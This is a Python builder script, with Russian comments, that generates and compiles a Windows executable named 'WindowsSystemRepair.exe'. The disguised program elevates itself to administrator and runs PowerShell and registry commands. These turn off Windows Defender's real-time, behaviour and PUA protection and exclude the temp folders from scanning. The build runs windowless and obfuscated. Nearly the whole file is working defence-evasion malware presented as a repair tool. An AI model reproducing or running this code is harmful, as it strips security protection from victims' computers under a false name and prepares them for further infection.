import os
import subprocess
import sys

def install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

def create_defender_disabler():
    disabler_code = '''import os
import subprocess
import time

def run_cmd_as_admin(command):
    try:
        from ctypes import windll
        if not windll.shell32.IsUserAnAdmin():
            windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        return subprocess.run(command, shell=True, capture_output=True, text=True)
    except:
        return None

def disable_defender():
    # Запускаем от имени администратора
    run_cmd_as_admin('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
    time.sleep(1)
    run_cmd_as_admin('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"')
    time.sleep(1)
    run_cmd_as_admin('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"')
    time.sleep(1)
    run_cmd_as_admin('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"')
    time.sleep(1)
    run_cmd_as_admin('powershell -Command "Add-MpPreference -ExclusionPath \\\"%TEMP%\\\""')
    time.sleep(1)
    run_cmd_as_admin('powershell -Command "Add-MpPreference -ExclusionPath \\\"C:\\\\Windows\\\\Temp\\\""')
    time.sleep(1)
    run_cmd_as_admin('powershell -Command "Set-MpPreference -PUAProtection disable"')
    time.sleep(1)
    run_cmd_as_admin('reg add \"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d 1 /f')

disable_defender()
'''

    with open('system_repair.py', 'w', encoding='utf-8') as f:
        f.write(disabler_code)

def compile_to_exe():
    # Компилируем с обфускацией
    os.system('pyinstaller --onefile --noconsole --name "WindowsSystemRepair" --key "SystemRepair123" system_repair.py')

if __name__ == "__main__":
    install_pyinstaller()
    create_defender_disabler()
    compile_to_exe()
    print("Скомпилировано как WindowsSystemRepair.exe")
